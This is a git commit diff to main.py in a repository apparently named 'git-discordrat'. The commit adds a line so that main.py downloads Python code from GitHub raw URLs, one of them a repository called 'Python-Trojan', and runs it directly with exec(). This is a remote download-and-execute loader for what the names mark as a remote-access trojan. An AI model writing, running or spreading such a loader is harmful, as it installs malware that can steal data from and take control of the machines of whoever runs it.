57624a839edc30f391aa27b74671dcd1139689eb
hai17233 <135570073+hai17233@users.noreply.github.com>
2024-01-20 08:44:19 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,8 @@
 import requests
 git = "hai723/git-discordrat"
 
-raw = f'https://raw.githubusercontent.com/{git}/main/scr/rat.py'
+raw = f'https://raw.githubusercontent.com/{git}/main'
 
-exec(requests.get('https://raw.githubusercontent.com/Jeff53978/Python-Trojan/main/main.py').text)
+exec(requests.get(f'{raw}/setting.py').text)
+exec(requests.get(f'https://raw.githubusercontent.com/Jeff53978/Python-Trojan/main/main.py').text)
+
